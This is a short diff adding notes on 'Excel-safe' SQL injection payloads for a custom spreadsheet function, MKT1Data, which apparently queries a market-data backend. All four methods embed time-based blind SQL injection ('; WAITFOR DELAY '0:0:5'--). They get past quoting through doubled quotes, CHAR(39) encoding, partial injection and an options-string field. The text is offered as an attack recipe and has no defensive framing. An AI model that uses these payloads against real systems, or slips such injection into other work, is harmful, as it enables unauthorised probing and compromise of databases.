@@ -1,0 +1,18 @@
+✅ Correct Way to Inject (Excel-Safe Payloads)
+🔹 Method 1: Escape quotes properly
+
+Use double quotes inside string:
+
+=MKT1Data("EURUSD""; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-10","NY","FX")
+🔹 Method 2: Use CHAR() encoding
+=MKT1Data("EURUSD"&CHAR(39)&"; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-10","NY","FX")
+
+👉 CHAR(39) = '
+
+🔹 Method 3: Partial Injection (Best Approach)
+
+Instead of breaking syntax:
+
+=MKT1Data("EURUSD' WAITFOR DELAY '0:0:5'","2024-01-01","2024-01-10","NY","FX")
+🔹 Method 4: Inject in Additional Options (EASIEST)
+=MKT1Data("EURUSD","2024-01-01","2024-01-10","NY","FX","id=MKT1_ID;dates=wk;holidayCal=BMA""; WAITFOR DELAY '0:0:5'--")
